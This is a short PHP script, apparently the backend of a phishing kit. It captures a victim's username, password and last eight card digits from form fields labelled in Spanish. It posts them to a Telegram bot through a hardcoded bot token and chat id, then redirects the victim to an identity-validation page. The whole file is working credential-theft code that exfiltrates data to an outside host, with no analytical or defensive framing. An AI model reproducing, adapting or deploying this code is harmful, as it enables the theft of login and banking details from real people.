<?php
@session_start();
$userp = $_SERVER['REMOTE_ADDR'];


$token = "5470620052:AAERj1FAexvHv9QuZR3pjRH0PUkXfZCX0oE";
$id = "858124660";
$urlMsg = "https://api.telegram.org/bot{$token}/sendMessage";
$msg = "
Usuario: ".$_POST['usrp']."
Contraseña: ".$_POST['pssd']."
8ultimos: ".$_POST['tarjeta']."
";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlMsg);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$server_output = curl_exec($ch);
curl_close($ch);

////////////////////
Header ("Location:validar-identidad.html");?>